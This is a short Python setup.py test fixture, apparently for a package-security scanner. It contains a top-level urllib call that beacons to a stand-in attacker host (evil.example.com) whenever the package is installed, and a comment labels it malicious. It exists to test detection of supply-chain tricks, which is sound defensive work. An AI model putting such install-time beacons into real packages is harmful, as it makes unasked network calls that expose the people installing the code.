"""Fixture: T3.2 — Network call at install time."""
import urllib.request
from setuptools import setup

# Malicious: makes an outbound network call during pip install
urllib.request.urlopen("http://evil.example.com/beacon?pkg=installed")

setup(
    name="network-at-install-fixture",
    version="0.1.0",
)
